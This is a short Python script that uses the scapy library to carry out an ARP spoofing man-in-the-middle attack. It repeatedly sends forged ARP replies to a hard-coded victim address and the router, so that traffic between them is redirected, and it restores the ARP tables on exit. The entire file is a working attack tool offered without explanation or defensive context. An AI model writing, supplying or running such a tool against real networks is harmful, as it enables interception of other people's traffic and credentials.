#!/usr/bin/env python
from scapy.layers.l2 import ARP, Ether, srp
from scapy.sendrecv import send
import time
import sys


victim_ip = "192.168.0.103"
router_ip = "192.168.0.1"


def get_mac_address(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast_request = broadcast/arp_request
    valid_list = srp(arp_broadcast_request, verbose=False, timeout=10)[0]
    return valid_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    spoof_packet = ARP(op=2, pdst=target_ip, hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    send(spoof_packet, verbose=False)


def restore(target_ip, router_ip):
    target_mac = get_mac_address(target_ip)
    router_mac = get_mac_address(router_ip)
    restore_target_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
    restore_router_packet = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=target_ip, hwsrc=target_mac)
    send(restore_router_packet, count=4, verbose=False)
    send(restore_target_packet, count=4, verbose=False)


try:
    count = 0
    while True:
        spoof(victim_ip, router_ip)
        spoof(router_ip, victim_ip)
        count += 2
        print("\r[+] sent packets: " + str(count)),
        sys.stdout.flush()
        time.sleep(2)
except:
    restore(victim_ip, router_ip)




